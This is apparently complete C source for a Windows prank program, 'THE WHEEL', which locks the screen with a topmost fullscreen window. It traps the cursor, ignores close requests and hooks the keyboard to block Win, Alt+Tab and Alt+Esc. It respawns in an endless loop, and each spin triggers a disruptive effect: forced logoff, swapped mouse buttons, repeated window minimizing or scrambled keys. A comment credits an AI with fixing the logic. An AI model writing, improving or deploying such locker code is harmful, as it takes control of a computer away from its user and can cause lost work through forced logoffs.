/*
Source code for Wheel application
author: Bryant Chang
*/

#include <windows.h>
#include <math.h>
#include <stdio.h>
#include <time.h>
#include <bcrypt.h>
#include "winconsts.h"
#include "libs/wheelswap.h"

#define ID_TIMER_WHEEL 666 // lol devil num
#define PI 3.1415927
#define ID_TIMER_RESULT 667
#define ID_TIMER_REACTION 668

HHOOK hKeyHook = NULL;
HWND hMainWnd = NULL;
HANDLE hAnnoyThread = NULL;
volatile int annoyThread = 0;
int secretIndex = 0;

float currentAngle = 0;
float wheelSpeed = 0;
int isSpinning = 0;
int showResult = 0;
int result = -1;

const char* labels[] = { "Nothing...", "Lucky!", "Jackpot?", "Nice try!", "Chances...", "Test of Fate"};
#define NUMITEMS (sizeof(labels) / sizeof(labels[0]))
#define SLICEANGLE (360.0f / NUMITEMS)
int isReactionGame = 0;
int reactionGameState = 0;
COLORREF reactionColor = RGB(0,0,0);
DWORD reactionStartTime = 0;

HFONT hWheelFont = NULL;
HFONT hResultFont = NULL;
HFONT hGameFont   = NULL;

void UnlockSystem() {
    if (hKeyHook) UnhookWindowsHookEx(hKeyHook);
    ClipCursor(NULL);
}
int GetRandomInt(int max) {
    unsigned int val = 0;
    NTSTATUS status = BCryptGenRandom(NULL, (BYTE*)&val, sizeof(val), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    if (status >= 0) { 
        return val % max;
    }
    DBG("Using fallback rand");
    return rand() % max;
}
DWORD WINAPI MinimizeThread(LPVOID lpParam) {
    while (annoyThread) {
        HWND hFore = GetForegroundWindow();
        char className[256];
        GetClassName(hFore, className, sizeof(className));
        if (strcmp(className, "Progman") != 0 && strcmp(className, "Shell_TrayWnd") != 0) {
            ShowWindow(hFore, SW_MINIMIZE);
        }
        for(int i = 0; i < 300 && annoyThread; i++) {
            Sleep(100); 
        }
    }
    return 0;
}
DWORD WINAPI SwapKeysThread(LPVOID lpParam) {
    int poolSize = (int)strlen(CHAR_POOL);
    srand((unsigned int)time(NULL) ^ GetTickCount());
    SwapKey1 = GetVK(CHAR_POOL[GetRandomInt(poolSize)]);
    SwapKey2 = GetVK(CHAR_POOL[GetRandomInt(poolSize)]);
    HHOOK hHook = NULL;
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, SwapKeys, GetModuleHandle(NULL), 0);
    MSG msg;
    while (annoyThread) {
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        Sleep(1);
    }
    UnhookWindowsHookEx(hHook);
    return 0;
}
void TriggerEffect(int index) {
    DBG("Triggering effects...");
    KillTimer(hMainWnd, ID_TIMER_RESULT);
    annoyThread = 1;
    switch(index) {
        case 0: break;
        case 1: SwapMouseButton(!GetSystemMetrics(SM_SWAPBUTTON)); break;
        case 2: hAnnoyThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MinimizeThread, NULL, 0, NULL); break;
        case 3: system("shutdown /l /f"); break;
        case 4: hAnnoyThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SwapKeysThread, NULL, 0, NULL); break;
        case 5: { 
            isReactionGame = 1;
            showResult = 0;
            reactionGameState = 0;
            reactionColor = RGB(200, 0, 0);
            InvalidateRect(hMainWnd, NULL, TRUE);
            SetTimer(hMainWnd, ID_TIMER_REACTION, (rand() % 3000) + 2000, NULL);
            return; 
        }
    }
    UnlockSystem();
    PostQuitMessage(0);
}

LRESULT CALLBACK LockKills(int nCode, WPARAM wParam, LPARAM lParam) {
    DBG("Locking user screen...");
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *pKbd = (KBDLLHOOKSTRUCT *)lParam;
        if (GetAsyncKeyState(VK_LCONTROL) & 0x8000) {
            if (wParam == WM_KEYDOWN) {
                if (pKbd->vkCode == (DWORD)toupper(PASS[secretIndex])) {
                    secretIndex++;
                    if (secretIndex == strlen(PASS)) {
                        secretIndex = 0;
                        UnlockSystem();
                        PostQuitMessage(0);
                        return 1; 
                    }
                } else {
                    secretIndex = 0;
                }
            }
        }
        BOOL bWinKey = (pKbd->vkCode == VK_LWIN || pKbd->vkCode == VK_RWIN);
        BOOL bAltTab = (pKbd->vkCode == VK_TAB && (pKbd->flags & LLKHF_ALTDOWN));
        BOOL bAltEsc = (pKbd->vkCode == VK_ESCAPE && (pKbd->flags & LLKHF_ALTDOWN));
        if (bWinKey || bAltTab || bAltEsc) return 1; 
    }
    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

void DrawWheel(HDC hdc, RECT rect) {
    int centerX = rect.right / 2;
    int centerY = rect.bottom / 2;
    int radius = 350;
    // never doing any graphics ever again
    for (int i = 0; i < NUMITEMS; i++) {
        int g = 80 + (i * (150 / NUMITEMS)); 
        int b = SLICEANGLE + (i * (120 / NUMITEMS));
        COLORREF color = RGB(0, g, b);
        float startDeg = currentAngle + (i * SLICEANGLE);
        float endDeg = currentAngle + ((i + 1) * SLICEANGLE);
        float startRad = startDeg * PI / 180.0f;
        float endRad = endDeg * PI / 180.0f;
        int xStart = centerX + (int)(radius * cos(startRad));
        int yStart = centerY + (int)(radius * sin(startRad));
        int xEnd   = centerX + (int)(radius * cos(endRad));
        int yEnd   = centerY + (int)(radius * sin(endRad));
        HBRUSH hBrush = CreateSolidBrush(color);
        HGDIOBJ oldBrush = SelectObject(hdc, hBrush);
        SelectObject(hdc, GetStockObject(NULL_PEN));
        Pie(hdc, centerX - radius, centerY - radius, centerX + radius, centerY + radius, xEnd, yEnd, xStart, yStart);
        float midRad = (startDeg + (SLICEANGLE / 2.0f)) * PI / 180.0f;
        int tx = centerX + (int)((radius / 1.5) * cos(midRad));
        int ty = centerY + (int)((radius / 1.5) * sin(midRad));
        SetTextColor(hdc, RGB(255, 255, 255));
        SetBkMode(hdc, TRANSPARENT);
        TextOut(hdc, tx - 30, ty, labels[i], (int)strlen(labels[i]));
        SelectObject(hdc, oldBrush);
        DeleteObject(hBrush);
    }
    if (showResult && result != -1) {
        HFONT oldFontRes = (HFONT)SelectObject(hdc, hResultFont);
        SetTextColor(hdc, RGB(230, 255, 255)); 
        TextOut(hdc, (rect.right/2) - 150, (rect.bottom/2) - 40, labels[result], strlen(labels[result]));
        SelectObject(hdc, oldFontRes);
    }
    // the arrow thing at the top
    HBRUSH hWhite = CreateSolidBrush(RGB(255, 255, 255));
    POINT pt[3] = { {centerX-15, centerY-radius-30}, {centerX+15, centerY-radius-30}, {centerX, centerY-radius+10} };
    SelectObject(hdc, hWhite);
    Polygon(hdc, pt, 3);
    DeleteObject(hWhite);
}
void StartSpin(HWND hWnd) {
    if (isSpinning) return;
    int targetSlice = GetRandomInt(NUMITEMS);
    float targetLandingAngle = (targetSlice * SLICEANGLE) + (SLICEANGLE / 2.0f);
    float totalRotationNeeded = (360.0f * (GetRandomInt(NUMITEMS) + 5)) + (270.0f - targetLandingAngle);
    wheelSpeed = totalRotationNeeded * (1.0f - 0.98f);
    isSpinning = 1;
    showResult = 0;
    SetTimer(hWnd, ID_TIMER_WHEEL, 20, NULL);
}

LRESULT CALLBACK WheelBehavior(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE: {
            currentAngle = (float)GetRandomInt(360);
            hWheelFont = CreateFont(30, 0, 0, 0, FW_EXTRABOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, VARIABLE_PITCH, "Comic Sans MS");
            hResultFont = CreateFont(100, 0, 0, 0, FW_EXTRABOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, VARIABLE_PITCH, "Comic Sans MS");
            hGameFont = CreateFont(80, 0, 0, 0, FW_EXTRABOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, VARIABLE_PITCH, "Comic Sans MS");
            RECT rect; GetWindowRect(hWnd, &rect);
            ClipCursor(&rect);
            break;
        }
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
            RECT rect;
            GetClientRect(hWnd, &rect);
            HDC memDC = CreateCompatibleDC(hdc);
            HBITMAP memBitmap = CreateCompatibleBitmap(hdc, rect.right, rect.bottom);
            SelectObject(memDC, memBitmap);
            HBRUSH hbg = CreateSolidBrush(RGB(0, 0, 0));
            FillRect(memDC, &rect, hbg);
            DeleteObject(hbg);
            if (isReactionGame) {
                HFONT oldFont = (HFONT)SelectObject(memDC, hGameFont);
                HBRUSH hBrush = CreateSolidBrush(reactionColor);
                FillRect(memDC, &rect, hBrush);
                DeleteObject(hBrush);
                SetTextColor(memDC, RGB(255, 255, 255));
                SetBkMode(memDC, TRANSPARENT);
                const char* text = (reactionGameState == 0) ? "WAIT FOR GREEN..." : "CLICK!";
                DrawText(memDC, text, -1, &rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER);
                SelectObject(memDC, oldFont);
            } else {
                HFONT oldFont = (HFONT)SelectObject(memDC, hWheelFont);
                DrawWheel(memDC, rect);
                SelectObject(memDC, oldFont);
            }
            BitBlt(hdc, 0, 0, rect.right, rect.bottom, memDC, 0, 0, SRCCOPY);
            DeleteObject(memBitmap);
            DeleteDC(memDC);
            EndPaint(hWnd, &ps);
            break;
        }
        case WM_LBUTTONDOWN:
            if (isReactionGame) {
                if (reactionGameState == 0) {
                    KillTimer(hWnd, ID_TIMER_REACTION);
                    reactionGameState = 0; 
                    reactionColor = RGB(200, 0, 0);
                    MessageBox(hWnd, "Too early!", "FAIL", MB_OK | MB_ICONERROR); // got lazy
                    TriggerEffect(5);
                } else if (reactionGameState == 1) {
                    DWORD elapsed = GetTickCount() - reactionStartTime;
                    char msg[64];
                    sprintf(msg, "Reaction Time: %dms", elapsed);
                    if (elapsed < REACTION_SPEED_REQ) {
                        MessageBox(hWnd, msg, "PASSED!", MB_OK);
                        isReactionGame = 0;
                        UnlockSystem();
                        PostQuitMessage(0);
                    } else {
                        MessageBox(hWnd, msg, "TOO SLOW ... TRY AGAIN!", MB_OK);
                        TriggerEffect(5);
                    }
                }
            } else if (!isSpinning) {
                StartSpin(hWnd);
            }
            break;
        case WM_TIMER:
            if (wParam == ID_TIMER_WHEEL) {
                currentAngle += wheelSpeed;
                wheelSpeed *= 0.98f; 
                if (wheelSpeed < 0.2f) {
                    KillTimer(hWnd, ID_TIMER_WHEEL);
                    int norm = (int)(270 - currentAngle) % 360;
                    if (norm < 0) norm += 360;
                    result = norm / SLICEANGLE;
                    showResult = 1;
                    SetTimer(hWnd, ID_TIMER_RESULT, 2000, NULL);
                }
                InvalidateRect(hWnd, NULL, TRUE);
            } else if (wParam == ID_TIMER_RESULT) {
                KillTimer(hWnd, ID_TIMER_RESULT);
                isSpinning = 0;
                TriggerEffect(result);
            } else if (wParam == ID_TIMER_REACTION) {
                KillTimer(hWnd, ID_TIMER_REACTION);
                reactionGameState = 1;
                reactionColor = RGB(0, 200, 0);
                reactionStartTime = GetTickCount();
                InvalidateRect(hWnd, NULL, TRUE);
            }
            break;
        case WM_CLOSE: return 0;
        case WM_DESTROY: {
            DeleteObject(hWheelFont);
            DeleteObject(hResultFont);
            DeleteObject(hGameFont);
            UnlockSystem(); 
            PostQuitMessage(0); break;
        }
        case WM_ERASEBKGND: return 1;
        default: return DefWindowProc(hWnd, msg, wParam, lParam);
    }
    return 0;
}

int Wheel() {
    // FINALLY WORKS AFTER SO LONG
    // claude fixed the logic for me
    // apparently it works when i clean the messages before the wheel is created
    // and doesnt work if i clean messaged right before this function ends.
    // idk why...
    MSG msg;
    while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
        if (msg.message == WM_QUIT) break;
    }

    isReactionGame = 0;
    showResult = 0;
    isSpinning = 0;
    secretIndex = 0;

    HINSTANCE hInst = GetModuleHandle(NULL);
    UnregisterClass("WheelLockClass", hInst);

    WNDCLASS wc = {0};
    wc.lpfnWndProc = WheelBehavior;
    wc.hInstance = hInst;
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = "WheelLockClass";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    RegisterClass(&wc);
    if (hMainWnd != NULL) {
        DestroyWindow(hMainWnd);
        hMainWnd = NULL;
    }
    hMainWnd = CreateWindowEx(WS_EX_TOPMOST, "WheelLockClass", "THE WHEEL",
        WS_POPUP | WS_VISIBLE, 0, 0,
        GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        NULL, NULL, hInst, NULL);
    if (hMainWnd == NULL) {
        char err[64];
        sprintf(err, "Window Creation Failed! Error: %lu\n", GetLastError());
        DBG(err);
        return 0;
    }
    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, LockKills, hInst, 0);
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnlockSystem();
    if (hMainWnd) {
        DestroyWindow(hMainWnd);
        hMainWnd = NULL;
    }
    Sleep(1000);
    return (int)msg.wParam;
}
DWORD WINAPI WheelThread(LPVOID lpParam) {
    while (TRUE) {
        DBG("Spawning wheel...");
        int result = Wheel(); 
        Sleep(WHEEL_RATE); 
        annoyThread = 0; 
        if (hAnnoyThread != NULL) {
            if (WaitForSingleObject(hAnnoyThread, 1000) == WAIT_TIMEOUT) {
                TerminateThread(hAnnoyThread, 0); 
            }
            CloseHandle(hAnnoyThread);
            hAnnoyThread = NULL;
        }
    }
    return 0;
}